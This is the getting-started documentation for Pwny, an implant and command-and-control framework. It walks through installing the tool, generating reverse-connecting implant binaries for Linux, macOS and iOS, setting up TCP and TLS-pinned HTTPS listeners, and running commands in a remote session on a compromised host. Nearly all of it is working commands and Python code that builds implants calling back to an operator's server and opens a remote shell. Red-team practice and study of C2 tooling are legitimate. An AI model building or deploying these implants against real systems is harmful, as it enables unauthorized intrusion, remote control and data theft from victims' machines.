# Getting Started

This guide covers installing Pwny, generating payloads, catching sessions, and running your first commands.

---

## Installation

### Via HatSploit (Recommended)

Installing HatSploit automatically includes Pwny:

```bash
pip3 install git+https://github.com/EntySec/HatSploit
```

### Standalone

```bash
pip3 install git+https://github.com/EntySec/Pwny
```

### Dependencies

- Python >= 3.7
- [Pex](https://github.com/EntySec/Pex) — protocol/utility library (installed automatically)
- `pycryptodome` — encryption support
- `pyaudio` — microphone streaming (optional, for `mic` command)

---

## Generating a Payload

Pwny ships with pre-compiled implant templates for every supported platform and architecture. Generate a payload using the Python API:

```python
from pwny import Pwny

pwny = Pwny(
    target='x86_64-linux-musl',
    options={
        'uri': 'tcp://192.168.1.10:8888'
    }
)

# Write EXE
with open('implant.exe', 'wb') as f:
    f.write(pwny.to_binary())
```

### Supported Targets

| Platform | Target Triple | Output |
|----------|--------------|--------|
| Linux x64 | `x86_64-linux-musl` | Static-PIE ELF |
| Linux aarch64 | `aarch64-linux-musl` | Static-PIE ELF |
| Linux armv5 | `armv5l-linux-musleabi` | Static-PIE ELF |
| Linux i486 | `i486-linux-musl` | Static-PIE ELF |
| Linux MIPS | `mips-linux-muslsf` | Static-PIE ELF |
| Linux MIPS LE | `mipsel-linux-muslsf` | Static-PIE ELF |
| Linux MIPS64 | `mips64-linux-musl` | Static-PIE ELF |
| Linux PPC | `powerpc-linux-muslsf` | Static-PIE ELF |
| Linux PPC64LE | `powerpc64le-linux-musl` | Static-PIE ELF |
| macOS x86_64 | `x86_64-apple-darwin` | Mach-O executable |
| macOS aarch64 | `aarch64-apple-darwin` | Mach-O executable |
| iOS aarch64 | `aarch64-iphone-darwin` | Mach-O bundle |

### Connection URIs

The `uri` option specifies how the implant connects back:

| Scheme | Example | Description |
|--------|---------|-------------|
| `tcp://` | `tcp://192.168.1.10:8888` | Raw TCP reverse connection |
| `http://` | `http://192.168.1.10:8080/callback` | HTTP-based C2 channel |
| `https://` | `https://192.168.1.10:443/callback` | HTTPS with TLS public key pinning |

---

## HTTPS with TLS Pinning

Pwny supports HTTPS communication with **TLS public key pinning** (HPKP-style SPKI pin). Instead of trusting a CA chain, the implant pins the server's exact public key hash — so even a self-signed certificate is cryptographically verified against the embedded pin.

### How It Works

1. The listener generates a self-signed RSA-2048 certificate at startup
2. The SPKI (Subject Public Key Info) SHA-256 hash is extracted and displayed
3. The pin (`sha256//base64hash`) is embedded in the implant's callback URI
4. At connect time the implant verifies the server's public key matches the pin — if not, the connection is rejected

There are three workflows — **listener first**, **generate first**, or **certificate hive** — depending on which side creates the certificate.

### Workflow A: Listener First

Start the listener, copy the auto-generated pin, then bake it into the implant.

```bash
# 1. Start HTTPS listener — note the pin
pwny listen 0.0.0.0 443 -t https -p linux -a x64
```

```
[*] Starting HTTPS listener on 0.0.0.0:443
[+] TLS pin: sha256//3I3sjY/H6JojhKCDyhD81ssivckp3QPRcHtp98nQJqA=
```

```bash
# 2. Generate implant with that pin
pwny generate x86_64-linux-musl \
    -u https://10.0.0.1:443/callback \
    --pin sha256//3I3sjY/H6JojhKCDyhD81ssivckp3QPRcHtp98nQJqA= \
    -o implant.exe
```

### Workflow B: Generate First

Generate the implant first — a certificate is automatically created alongside the binary. Then start the listener using that certificate.

```bash
# 1. Generate implant — cert + key are auto-created, pin is embedded
pwny generate x86_64-linux-musl \
    -u https://10.0.0.1:443/callback \
    -o implant.exe
```

```
[+] Generated server.crt and server.key
[+] TLS pin: sha256//3I3sjY/H6JojhKCDyhD81ssivckp3QPRcHtp98nQJqA=
[*] Use --cert server.crt --key server.key with 'pwny listen -t https'
[+] Written 110740 bytes to implant.exe
```

```bash
# 2. Start listener with the generated cert
pwny listen 0.0.0.0 443 -t https --cert server.crt --key server.key -p linux -a x64
```

You can control where the cert files are saved with `--cert` and `--key`:

```bash
pwny generate x86_64-linux-musl \
    -u https://10.0.0.1:443/callback \
    --cert /opt/certs/pwny.crt --key /opt/certs/pwny.key \
    -o implant.exe
```

### Workflow C: Certificate Hive

The certificate hive (`~/.pwny/certs/`) stores named certificates so you can reference them by name instead of managing files manually.

```bash
# 1. Create a named certificate
pwny cert generate myserver
```

```
[+] Generated certificate 'myserver'
[*] Pin: sha256//3I3sjY/H6JojhKCDyhD81ssivckp3QPRcHtp98nQJqA=
```

```bash
# 2. Generate implant referencing the certificate by name
pwny generate x86_64-linux-musl \
    -u https://10.0.0.1:443/callback \
    -n myserver \
    -o implant.exe
```

```
[+] Using certificate 'myserver' (pin: sha256//3I3sjY/...)
[+] Written 110740 bytes to implant.exe
```

```bash
# 3. Start listener with the same name
pwny listen 0.0.0.0 443 -t https -n myserver -p linux -a x64
```

Manage hive entries:

```bash
# List all certificates
pwny cert list

# Show details for a certificate
pwny cert show myserver

# Rename a certificate
pwny cert rename myserver production

# Delete a certificate
pwny cert delete production
```

### Python API

**Listener first** — start the listener, extract the pin, generate the binary:

```python
from pwny import Pwny, HTTPSListener
from pwny.session import PwnyHTTPSession
import threading

# Start HTTPS listener
listener = HTTPSListener('0.0.0.0', 443)
listener.listen()
print(f'Pin: {listener.pin}')

thread = threading.Thread(target=listener.loop, daemon=True)
thread.start()

# Wait for connection and interact
session = PwnyHTTPSession()
session.info['Platform'] = 'linux'
session.info['Arch'] = 'x64'
session.open(listener)
session.interact()

listener.stop()
```

**Generate first** — create a cert, embed the pin, then start the listener with it:

```python
from pwny import Pwny, HTTPSListener, extract_pin
from pwny.https import generate_self_signed

# Generate cert and extract pin
generate_self_signed('server.key', 'server.crt')
pin = extract_pin('server.crt')

# Build pinned implant
pwny = Pwny(
    target='x86_64-linux-musl',
    options={
        'uri': 'https://10.0.0.1:443/callback',
        'pin': pin,
    }
)

with open('implant.exe', 'wb') as f:
    f.write(pwny.to_binary())

# Later — start listener with the same cert
listener = HTTPSListener('0.0.0.0', 443,
                         keyfile='server.key',
                         certfile='server.crt')
listener.listen()
assert listener.pin == pin  # same pin
```

### Custom Certificates

`HTTPSListener` accepts optional `keyfile` and `certfile` paths. If omitted, a self-signed certificate is auto-generated in a temporary directory.

```python
listener = HTTPSListener(
    '0.0.0.0', 443,
    keyfile='/path/to/server.key',
    certfile='/path/to/server.crt',
)
```

You can also extract the pin from any PEM certificate without starting a listener:

```python
from pwny import extract_pin

pin = extract_pin('/path/to/server.crt')
print(pin)  # sha256//...
```

### Certificate Hive (Python API)

```python
from pwny import CertHive, Pwny, HTTPSListener

hive = CertHive()  # uses ~/.pwny/certs/

# Generate a named certificate
meta = hive.generate('myserver')
print(meta['pin'])  # sha256//...

# Build implant with hive cert
pwny = Pwny(
    target='x86_64-linux-musl',
    options={
        'uri': 'https://10.0.0.1:443/callback',
        'pin': meta['pin'],
    }
)

with open('implant.exe', 'wb') as f:
    f.write(pwny.to_binary())

# Start listener with hive cert
listener = HTTPSListener('0.0.0.0', 443,
                         keyfile=meta['keyfile'],
                         certfile=meta['certfile'])
listener.listen()

# Manage entries
hive.list()                           # list all
hive.get('myserver')                  # get metadata
hive.rename('myserver', 'production') # rename
hive.delete('production')             # delete
```

---

## Command-Line Interface

Pwny includes a `pwny` CLI that covers payload generation, template management, and session handling without writing any Python code.

```
usage: pwny [-h] {listen,generate,templates,check,cert} ...

Pwny implant framework — build, deploy, and interact.
```

### pwny listen

Start a listener and drop into the interactive console when an implant connects.

```
pwny listen [-h] [-t {tcp,dtcp,http,https}] [-p PLATFORM] [-a ARCH] [-s] [--no-banner] [--cert CERT] [--key KEY] [-n NAME] host port
```

| Argument | Description |
|----------|-------------|
| `host` | Address to bind to (e.g. `0.0.0.0`) |
| `port` | Port to listen on |
| `-t`, `--proto` | Listener protocol: `tcp` (default), `dtcp`, `http`, or `https` |
| `-p`, `--platform` | Target platform hint (e.g. `linux`, `macos`, `iphone`) |
| `-a`, `--arch` | Target architecture hint (e.g. `x64`, `aarch64`) |
| `-s`, `--secure` | Establish encrypted session after connect |
| `--no-banner` | Suppress the startup banner |
| `--cert` | Path to PEM certificate for HTTPS listener |
| `--key` | Path to PEM private key for HTTPS listener |
| `-n`, `--name` | Certificate name from the hive (use with `-t https`) |

**TCP listener** (most common):

```bash
pwny listen 0.0.0.0 8888 -p linux -a x64
```

```
[*] Starting TCP listener on 0.0.0.0:8888
[*] Waiting for connection...
[+] Connection from 192.168.1.42:49152
```

**Dual-TCP listener** (separate egress/ingress channels):

```bash
pwny listen 0.0.0.0 8888 -t dtcp -p linux -a x64
```

```
[*] Starting dual-TCP listener on 0.0.0.0:8888
[*] Waiting for egress connection...
[+] Egress from 192.168.1.42:49152
[*] Waiting for ingress connection...
[+] Ingress from 192.168.1.42:49153
```

**HTTP listener**:

```bash
pwny listen 0.0.0.0 8080 -t http -p linux -a x64
```

**HTTPS listener** (auto-generates certificate, prints TLS pin):

```bash
pwny listen 0.0.0.0 443 -t https -p linux -a x64
```

```
[*] Starting HTTPS listener on 0.0.0.0:443
[+] TLS pin: sha256//3I3sjY/H6JojhKCDyhD81ssivckp3QPRcHtp98nQJqA=
```

**HTTPS listener with custom certificate:**

```bash
pwny listen 0.0.0.0 443 -t https --cert server.crt --key server.key -p linux -a x64
```

**With encryption** — negotiate AES/ChaCha20 key exchange immediately after connect:

```bash
pwny listen 0.0.0.0 8888 -p linux -a x64 -s
```

### pwny generate

Generate an implant binary with baked-in callback options.

```
pwny generate [-h] [-f FORMAT] [-o OUTPUT] [-u URI] [-U UUID] [--pin PIN] [--cert CERT] [--key KEY] [-n NAME] target
```

| Argument | Description |
|----------|-------------|
| `target` | Target triplet (e.g. `x86_64-linux-musl`, `x86_64-linux-musl`) |
| `-f`, `--format` | Binary format: `exe` (default), `bin`, `dll`, `service` |
| `-o`, `--output` | Output file path (default: `pwny.out`, use `-` for stdout) |
| `-u`, `--uri` | Callback URI (e.g. `tcp://10.0.0.1:8888`) |
| `-U`, `--uuid` | Session UUID |
| `--pin` | TLS public key pin (`sha256//base64hash`) for HTTPS URIs |
| `--cert` | Output path for auto-generated PEM certificate (default: `server.crt`) |
| `--key` | Output path for auto-generated PEM private key (default: `server.key`) |
| `-n`, `--name` | Certificate name from the hive (use with `https://` URIs) |

> **Note:** When `-u` is an `https://` URI and neither `--pin` nor `--name` is provided, a certificate is auto-generated, the pin is extracted and embedded, and the cert/key files are saved for use with `pwny listen`.
> When `--name` is given, the pin is read from the hive certificate instead.

**Generate a Linux implant**:

```bash
pwny generate x86_64-linux-musl -u tcp://10.0.0.1:8888 -o implant
```

```
[+] Written 110740 bytes to implant
```

**Generate a Linux implant as raw binary**:

```bash
pwny generate x86_64-linux-musl -f bin -u tcp://10.0.0.1:8888 -o implant.bin
```

**Generate a pinned HTTPS implant** (with explicit pin):

```bash
pwny generate x86_64-linux-musl \
    -u https://10.0.0.1:443/callback \
    --pin sha256//3I3sjY/H6JojhKCDyhD81ssivckp3QPRcHtp98nQJqA= \
    -o implant
```

**Generate an HTTPS implant** (auto-creates cert + pin):

```bash
pwny generate x86_64-linux-musl \
    -u https://10.0.0.1:443/callback \
    -o implant
```

```
[+] Generated server.crt and server.key
[+] TLS pin: sha256//3I3sjY/H6JojhKCDyhD81ssivckp3QPRcHtp98nQJqA=
[*] Use --cert server.crt --key server.key with 'pwny listen -t https'
[+] Written 110740 bytes to implant.exe
```

**Pipe binary to stdout** (useful for chaining):

```bash
pwny generate x86_64-linux-musl -u tcp://10.0.0.1:8888 -o - | base64 > payload.b64
```

### pwny templates

List all available implant templates and their supported formats.

```bash
pwny templates
```

```
Templates:

    Target                    Formats
    aarch64-linux-musl        bin, exe
    armv5l-linux-musleabi     bin, exe
    i486-linux-musl           bin, exe
    mips-linux-muslsf         bin, exe
    mips64-linux-musl         bin, exe
    mipsel-linux-muslsf       bin, exe
    powerpc-linux-muslsf      bin, exe
    powerpc64le-linux-musl    bin, exe
    x86_64-linux-musl         bin, exe
    x86_64-linux-musl        dll, exe, service
```

### pwny check

Verify that a template exists for a given target and format.

```
pwny check [-h] [-f FORMAT] target
```

| Argument | Description |
|----------|-------------|
| `target` | Target triplet |
| `-f`, `--format` | Binary format to check (default: `exe`) |

```bash
pwny check x86_64-linux-musl
```

```
[+] /path/to/pwny/templates/x86_64-linux-musl.exe (110740 bytes)
```

```bash
pwny check x86_64-linux-musl -f dll
```

```
[+] /path/to/pwny/templates/x86_64-linux-musl.dll (95232 bytes)
```

### pwny cert

Manage the certificate hive — a persistent store of named TLS certificates at `~/.pwny/certs/`.

```
pwny cert {generate,list,show,delete,rename} ...
```

**Generate a named certificate:**

```bash
pwny cert generate myserver
```

```
[+] Generated certificate 'myserver'
[*] Pin: sha256//3I3sjY/H6JojhKCDyhD81ssivckp3QPRcHtp98nQJqA=
```

**List all certificates:**

```bash
pwny cert list
```

```
Certificates:

    Name        Pin
    myserver    sha256//3I3sjY/H6JojhKCDyhD81ssivckp3QPRcHtp98nQJqA=
    staging     sha256//UprMoOKvaze9tq5WtRk17SgewI90F6UC7jf0JQ2+bOY=
```

**Show details:**

```bash
pwny cert show myserver
```

```
[*] Name:     myserver
[*] Pin:      sha256//3I3sjY/H6JojhKCDyhD81ssivckp3QPRcHtp98nQJqA=
[*] Cert:     /Users/user/.pwny/certs/myserver/server.crt
[*] Key:      /Users/user/.pwny/certs/myserver/server.key
```

**Rename:**

```bash
pwny cert rename myserver production
```

**Delete:**

```bash
pwny cert delete staging
```

### Quick Workflow

Generate a payload and catch the session in two terminals:

```bash
# Terminal 1 — generate and deploy
pwny generate x86_64-linux-musl -u tcp://10.0.0.1:8888 -o implant.exe

# Terminal 2 — listen for callback
pwny listen 0.0.0.0 8888 -p linux -a x64 -s
```

**HTTPS workflow A** — listener first (to obtain the pin), then generate:

```bash
# Terminal 1 — start HTTPS listener, note the pin
pwny listen 0.0.0.0 443 -t https -p linux -a x64 -s

# Terminal 2 — generate implant with the pin
pwny generate x86_64-linux-musl \
    -u https://10.0.0.1:443/callback \
    --pin sha256//3I3sjY/H6JojhKCDyhD81ssivckp3QPRcHtp98nQJqA= \
    -o implant.exe
```

**HTTPS workflow B** — generate first (auto-creates cert), then listener with that cert:

```bash
# Terminal 1 — generate implant + cert
pwny generate x86_64-linux-musl \
    -u https://10.0.0.1:443/callback \
    -o implant.exe

# Terminal 2 — start listener with the generated cert
pwny listen 0.0.0.0 443 -t https --cert server.crt --key server.key -p linux -a x64 -s
```

**HTTPS workflow C** — certificate hive (simplest):

```bash
# One-time: create a named certificate
pwny cert generate myserver

# Generate implant by name
pwny generate x86_64-linux-musl \
    -u https://10.0.0.1:443/callback \
    -n myserver -o implant.exe

# Listen by name
pwny listen 0.0.0.0 443 -t https -n myserver -p linux -a x64 -s
```

---

## Catching a Session

### Standalone Listener

The simplest way to test is with the included TCP listener:

```bash
python3 examples/tcp_server.py 0.0.0.0 8888 linux x64
```

```
Waiting for connection ...
```

Once the implant connects, you're dropped into the Pwny console:

```
     cOKxc                 Name: Ubuntu 22.04
    .0K0kWc               Kernel: 5.15.0-generic
    .x,':Nd                 Time: Mon Mar 17 14:22:15 2026
   .l... ,Wk.             Vendor: GNU/Linux
  .0.     ,NN,              Arch: x86_64
 .K;       0N0            Memory: 4.2 GB/16.0 GB
..'cl.    'xO:              UUID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
,''';c'':Oc',,.         Commands: 34
  ..'.  ..,,.              Plugins: 0

pwny:/home/target$
```

### HatSploit Integration

Within HatSploit, Pwny sessions are created automatically when a Pwny payload connects. Use `sessions -l` to list active sessions and `sessions -i <id>` to interact.

### Programmatic Usage

```python
import socket
from pwny.session import PwnySession

sock = socket.socket()
sock.bind(('0.0.0.0', 8888))
sock.listen()
conn, addr = sock.accept()

session = PwnySession()
session.info['Platform'] = 'linux'
session.info['Arch'] = 'x64'
session.open(conn)

# Execute commands programmatically
output = session.console.pwny_exec('whoami')
print(output)

# Or drop into interactive console
session.interact()
```

---

## First Commands

Once inside the Pwny console, try these:

```
pwny:/home/target$ sysinfo
```

Displays OS name, version, architecture, memory usage, and UUID.

```
pwny:/home/target$ whoami
target
```

```
pwny:/home/target$ pwd
/home/target
```

```
pwny:/home/target$ ps
Process List
============

 PID   CPU  Name                Path
 ---   ---  ----                ----
 1     0.0  systemd             /sbin/systemd
 648   0.1  sshd                /usr/sbin/sshd
 1024  0.3  bash                /bin/bash
 ...
```

```
pwny:/home/target$ list
Listing: .
=========

 Mode        Size    Type     Modified             Name
 ----        ----    ----     --------             ----
 drwxr-xr-x  0 B    dir      2026-03-15 10:30:00  Documents
 drwxr-xr-x  0 B    dir      2026-03-14 08:15:00  Downloads
 -rw-r--r--  1.2 KB file     2026-03-17 14:00:00  notes.txt
 ...
```

---

## Securing the Channel

By default, the C2 channel is unencrypted. Enable encryption:

```
pwny:/home/target$ secure
[*] Securing communication with AES256-CBC...
[+] Communication secured.
```

Or choose an algorithm:

```
pwny:/home/target$ secure -a chacha20
[*] Securing communication with ChaCha20...
[+] Communication secured.
```

To disable encryption:

```
pwny:/home/target$ unsecure
[*] Unsecuring communication...
[+] Communication unsecured.
```

---

## Loading Plugins

Plugins extend Pwny with additional commands. Load a plugin by name:

```
pwny:/home/target$ load test
[*] Loading test...
[+] Plugin test loaded.
```

Loaded plugins register new commands in the console. See `help` after loading to view them.

---

## Next Steps

- [CLI Reference](#command-line-interface) — `pwny listen`, `pwny generate`, `pwny templates`, `pwny check`
- [Console Features](console.md) — prompt customization, environment variables, banners
- [Commands Reference](commands.md) — complete list of all cross-platform commands
- [Plugin Development](plugin-development.md) — write your own plugins
- Platform-specific guides: [Linux](linux/), [macOS](macos/), [iOS](ios/)
